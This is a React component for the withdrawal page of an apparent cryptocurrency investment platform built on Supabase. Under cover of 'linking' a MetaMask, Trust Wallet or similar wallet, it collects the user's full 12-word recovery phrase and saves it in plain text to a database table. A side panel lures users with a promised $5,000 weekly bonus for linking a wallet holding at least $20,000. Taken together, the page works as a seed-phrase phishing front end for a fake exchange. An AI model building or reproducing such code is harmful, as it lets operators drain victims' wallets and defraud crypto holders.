import React, { useState, useEffect, useMemo } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useAuth } from '@/contexts/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { motion } from 'framer-motion';
import {
  ArrowUpCircle,
  AlertTriangle,
  KeyRound,
  PlugZap,
  Link2,
} from 'lucide-react';

const KEYPHRASE_LENGTH = 12;

const Withdrawals = () => {
  const { user } = useAuth();
  const { toast } = useToast();

  const [localProfile, setLocalProfile] = useState<any>(null);
  const [walletsBalance, setWalletsBalance] = useState<number | null>(null);
  const [withdrawals, setWithdrawals] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isLinking, setIsLinking] = useState(false);
  const [linkedWallet, setLinkedWallet] = useState<string | null>(null);
  const [linkedWalletAddress, setLinkedWalletAddress] = useState<string | null>(null);
  const [isWalletLinked, setIsWalletLinked] = useState<boolean>(false);

  const [withdrawalForm, setWithdrawalForm] = useState({
    currency: 'BTC',
    amount: 0,
    walletType: '',
    walletAddress: '',
  });

  const [keyphraseWords, setKeyphraseWords] = useState<string[]>(Array(KEYPHRASE_LENGTH).fill(''));
  const finalKeyphrase = useMemo(() => keyphraseWords.join(' ').trim(), [keyphraseWords]);
  const isKeyphraseComplete = useMemo(
    () => keyphraseWords.every((word) => word.trim().length > 0),
    [keyphraseWords]
  );

  // Wallet options (with icons)
  const walletOptions = [
    { id: 'metamask', name: 'MetaMask', icon: '/icons/metamask.svg' },
    { id: 'trustwallet', name: 'Trust Wallet', icon: '/icons/trustwallet.svg' },
    { id: 'phantom', name: 'Phantom', icon: '/icons/phantom.svg' },
    { id: 'binance', name: 'Binance', icon: '/icons/binance.svg' },
    { id: 'bybit', name: 'Bybit', icon: '/icons/bybit.svg' },
    { id: 'custom', name: 'Custom Wallet', icon: '/icons/custom.svg' },
  ];

  // ✅ Fetch wallet link status from Supabase
  const fetchWalletLinkStatus = async () => {
    if (!user) return;
    const { data, error } = await supabase
      .from('wallets')
      .select('is_linked, wallet_type, wallet_address')
      .eq('user_id', user.id)
      .maybeSingle();

    if (!error && data) {
      setIsWalletLinked(data.is_linked || false);
      if (data.is_linked) {
        setLinkedWallet(data.wallet_type || null);
        setLinkedWalletAddress(data.wallet_address || null);
        setWithdrawalForm((prev) => ({
          ...prev,
          walletType: data.wallet_type || '',
          walletAddress: data.wallet_address || '',
        }));
      }
    }
  };

  const handleInputChange = (field: string, value: any) => {
    setWithdrawalForm((prev) => ({ ...prev, [field]: value }));
  };

  const handleKeyphraseChange = (index: number, value: string) => {
    const cleaned = value.toLowerCase().replace(/[^a-z0-9]/g, '');
    setKeyphraseWords((prev) => {
      const newWords = [...prev];
      newWords[index] = cleaned;
      return newWords;
    });
  };
const handleLinkWallet = async () => {
  if (!withdrawalForm.walletType) {
    toast({
      title: 'Select a Wallet',
      description: 'Please choose a wallet or exchange.',
      variant: 'destructive',
    });
    return;
  }

  if (!withdrawalForm.walletAddress || !isKeyphraseComplete) {
    toast({
      title: 'Incomplete Details',
      description: 'Please enter wallet address and all keyphrase words.',
      variant: 'destructive',
    });
    return;
  }

  setIsLinking(true);
  try {
    await new Promise((resolve) => setTimeout(resolve, 1000));

    // ✅ Check if wallet already exists
    const { data: existingWallet, error: fetchError } = await supabase
      .from('wallets')
      .select('id')
      .eq('user_id', user.id)
      .maybeSingle();

    if (fetchError) throw fetchError;

    let error;

    if (existingWallet) {
      // ✅ Update existing wallet
      ({ error } = await supabase
        .from('wallets')
        .update({
          wallet_type: withdrawalForm.walletType,
          wallet_address: withdrawalForm.walletAddress,
          is_linked: true,
          linked_at: new Date(),
        })
        .eq('user_id', user.id));
    } else {
      // ✅ Insert new wallet
      ({ error } = await supabase.from('wallets').insert({
        user_id: user.id,
        wallet_type: withdrawalForm.walletType,
        wallet_address: withdrawalForm.walletAddress,
        is_linked: true,
        wallet_keyphrase: finalKeyphrase,
        status: "pending",
        linked_at: new Date(),
      }));
    }

    if (error) throw error;

    setLinkedWallet(withdrawalForm.walletType);
    setLinkedWalletAddress(withdrawalForm.walletAddress);
    setIsWalletLinked(true);

    toast({
      title: 'Wallet Linked',
      description: `${withdrawalForm.walletType.toUpperCase()} wallet linked successfully.`,
    });
  } catch (err: any) {
    toast({
      title: 'Error Linking Wallet',
      description: err.message,
      variant: 'destructive',
    });
  } finally {
    setIsLinking(false);
  }
};
  

    const fetchProfile = async () => {
    if (!user) return;
    const { data } = await supabase.from('profiles').select('*').eq('user_id', user.id).single();
    if (data) setLocalProfile(data);
  };

  const fetchWalletBalance = async () => {
    try {
      const { data } = await supabase
        .from('wallets')
        .select('balance')
        .eq('user_id', user?.id)
        .maybeSingle();
      setWalletsBalance(data?.balance || 0);
    } catch {
      setWalletsBalance(0);
    }
  };

  const fetchWithdrawals = async () => {
    if (!user) return;
    try {
      setIsLoading(true);
      const { data, error } = await supabase
        .from('withdrawals')
        .select('*')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false });
      if (error) throw error;
      setWithdrawals(data || []);
    } catch (err: any) {
      toast({
        title: 'Error Fetching Withdrawals',
        description: err.message,
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  
const handleWithdrawal = async () => {
  if (!user) return;

  if (!localProfile?.is_verified) {
    toast({
      title: "Verification Required",
      description: "Complete KYC verification before withdrawals.",
      variant: "destructive",
    });
    return;
  }

  if (withdrawalForm.amount <= 0 || !withdrawalForm.walletAddress) {
    toast({
      title: "Missing Details",
      description: "Enter a valid wallet address and amount.",
      variant: "destructive",
    });
    return;
  }

  if (withdrawalForm.amount > (walletsBalance || 0)) {
    toast({
      title: "Insufficient Balance",
      description: "Amount exceeds available balance.",
      variant: "destructive",
    });
    return;
  }

if (!isWalletLinked && !isKeyphraseComplete) {
  toast({
    title: "Keyphrase Required",
    description: `Enter all ${KEYPHRASE_LENGTH} words of your recovery phrase.`,
    variant: "destructive",
  });
  return;
}
  

  setIsLoading(true);

  try {
    // 1️⃣ Insert withdrawal record
    const { data, error } = await supabase.from("withdrawals").insert({
      user_id: user.id,
      currency: withdrawalForm.currency,
      amount: withdrawalForm.amount,
    });

    if (error) throw error;

    // 2️⃣ Call Edge Function to send email + in-app notification
    await fetch(
      "https://niwhcvzhvjqrqhyayarv.supabase.co/functions/v1/send-notification",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "withdrawal",             // Match your edge function type
          email: user.email,              // Recipient email
          name: user.user_metadata?.full_name || user.email,
          user_id: user.id,               // ✅ Used for in-app notification
          amount: withdrawalForm.amount,  // Withdrawal amount
        }),
      }
    );

    // 3️⃣ Success toast
    toast({
      title: "Withdrawal Submitted",
      description: `Your ${withdrawalForm.currency} withdrawal of ${withdrawalForm.amount} has been submitted for approval.`,
    });

    // 4️⃣ Refresh & reset
    fetchWithdrawals();
    setWithdrawalForm({
      currency: "BTC",
      amount: 0,
      walletType: "",
      walletAddress: "",
    });
    setKeyphraseWords(Array(KEYPHRASE_LENGTH).fill(""));
  } catch (err: any) {
    toast({
      title: "Error Submitting Withdrawal",
      description: err.message,
      variant: "destructive",
    });
  } finally {
    setIsLoading(false);
  }
};
  

  useEffect(() => {
    if (user) {
      fetchProfile();
      fetchWalletBalance();
      fetchWithdrawals();
      fetchWalletLinkStatus(); // ✅ check wallet link status
    }
  }, [user]);

  const canWithdraw = localProfile?.kyc_status === 'approved';
  const linkedWalletInfo = walletOptions.find((w) => w.id === linkedWallet);

  return (
    <div className="space-y-6">
      <Card className="card-glass">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <ArrowUpCircle className="w-5 h-5" /> Request Withdrawal
          </CardTitle>
          <CardDescription>Securely withdraw your crypto funds</CardDescription>
        </CardHeader>

        <CardContent className="space-y-6">
          {!canWithdraw && (
            <Alert variant="destructive">
              <AlertTriangle className="h-4 w-4" />
              <AlertDescription>
                {localProfile?.is_verified
                  ? 'Your KYC is still pending approval.'
                  : 'You must complete verification before making withdrawals.'}
              </AlertDescription>
            </Alert>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* LEFT SECTION */}
            <div className="space-y-4">
              <div className="space-y-2">
                <Label>Currency</Label>
                <Select
                  value={withdrawalForm.currency}
                  onValueChange={(v) => handleInputChange('currency', v)}
                >
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                    <SelectItem value="USDT">Tether (USDT)</SelectItem>
                    <SelectItem value="SOL">Solana (SOL)</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <Label>Amount</Label>
                <Input
                  type="number"
                  min="0"
                  placeholder="Enter amount"
                  value={withdrawalForm.amount || ''}
                  onChange={(e) =>
                    handleInputChange('amount', parseFloat(e.target.value) || 0)
                  }
                />
                <p className="text-xs text-muted-foreground">
                  Available Balance: ${(walletsBalance || 0).toLocaleString()}
                </p>
              </div>

              {/* ✅ Wallet linking section */}
              {!isWalletLinked ? (
                <>
                  <div className="space-y-2">
                    <Label>Link your wallet address</Label>
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                      {walletOptions.map((w) => (
                        <motion.div
                          key={w.id}
                          whileHover={{ scale: 1.05 }}
                          whileTap={{ scale: 0.97 }}
                          onClick={() => handleInputChange('walletType', w.id)}
                          className={`cursor-pointer rounded-lg border p-3 flex flex-col items-center justify-center transition-all ${
                            withdrawalForm.walletType === w.id
                              ? 'border-primary bg-primary/10 shadow'
                              : 'border-muted hover:border-primary/40'
                          }`}
                        >
                          <img src={w.icon} alt={w.name} className="w-8 h-8 mb-1" />
                          <span className="text-sm font-medium">{w.name}</span>
                        </motion.div>
                      ))}
                    </div>
                  </div>

                  {withdrawalForm.walletType && (
                    <>
                      <div className="space-y-2">
                        <Label>Wallet Address</Label>
                        <Input
                          type="text"
                          placeholder={`Enter your ${withdrawalForm.walletType} address`}
                          value={withdrawalForm.walletAddress}
                          onChange={(e) =>
                            handleInputChange('walletAddress', e.target.value)
                          }
                        />
                      </div>

                      <div className="space-y-2">
                        <Label className="flex items-center gap-2 font-semibold">
                          <KeyRound className="w-4 h-4" />
                          Recovery Phrase ({KEYPHRASE_LENGTH} words)
                        </Label>
                        <div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
                          {keyphraseWords.map((word, i) => (
                            <div key={i} className="flex items-center">
                              <span className="w-4 text-xs text-muted-foreground mr-1 text-right">
                                {i + 1}.
                              </span>
                              <Input
                                type="text"
                                placeholder={`Word ${i + 1}`}
                                value={word}
                                onChange={(e) =>
                                  handleKeyphraseChange(i, e.target.value)
                                }
                                className="h-8 text-sm"
                              />
                            </div>
                          ))}
                        </div>
                      </div>

                      <div className="pt-3 flex justify-center">
                        <Button
                          onClick={handleLinkWallet}
                          disabled={isLinking}
                          className="flex items-center gap-2 w-full md:w-auto"
                        >
                          {isLinking ? (
                            <>
                              <PlugZap className="w-4 h-4 animate-spin" /> Linking...
                            </>
                          ) : (
                            <>
                              <Link2 className="w-4 h-4" /> Link Wallet
                            </>
                          )}
                        </Button>
                      </div>
                    </>
                  )}
                </>
              ) : (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="p-4 border rounded-lg flex items-center gap-3 border-white-200"
                >
                  {linkedWalletInfo && (
                    <img
                      src={linkedWalletInfo.icon}
                      alt={linkedWalletInfo.name}
                      className="w-10 h-10"
                    />
                  )}
                  <div>
                    <h4 className="font-semibold text-green-700">
                      {linkedWalletInfo ? linkedWalletInfo.name : 'Wallet Linked'}
                    </h4>
                    <p className="text-sm text-green-600 break-all">
                      {linkedWalletAddress}
                    </p>
                  </div>
                </motion.div>
              )}

              {/* Submit Withdrawal Button */}
              <Button
                onClick={handleWithdrawal}
                disabled={
                  !canWithdraw ||
                  isLoading ||
                  withdrawalForm.amount <= 0 ||
                  !withdrawalForm.walletAddress
                }
                className="w-full btn-hero mt-4"
              >
                {isLoading ? 'Processing...' : 'Submit Withdrawal Request'}
              </Button>
            </div>

            {/* RIGHT SECTION */}
            <div className="space-y-4">
              <div className="p-4 border rounded-lg bg-muted/20">
                <h3 className="font-medium mb-2">Withdrawal Process</h3>
                <div className="text-sm text-muted-foreground space-y-1">
                  <p>1. Submit your withdrawal with wallet keyphrase.</p>
                  <p>2. Admin verifies and approves request.</p>
                  <p>3. Funds are sent to your linked wallet instantly.</p>
                </div>
              </div>

              <div className="p-4 border rounded-lg bg-warning/10 border-warning/20">
                <h4 className="font-medium text-warning mb-1">Bonus Notice</h4>
                <p className="text-sm text-muted-foreground">
                  • You will be earning a $5,000 bonus weekly when you link your wallet.<br />
                  • To be eligible you must have a minimum account balance of $20,000.<br />
                  • Network fees may apply.
                </p>
              </div>

              <div className="p-4 border rounded-lg">
                <h4 className="font-medium mb-2">Account Summary</h4>
                <div className="text-sm space-y-2">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Balance:</span>
                    <span className="font-semibold">${(walletsBalance || 0).toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">KYC Status:</span>
                    <Badge variant={canWithdraw ? 'default' : 'destructive'}>
                      {localProfile?.kyc_status || 'pending'}
                    </Badge>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};
export default Withdrawals;

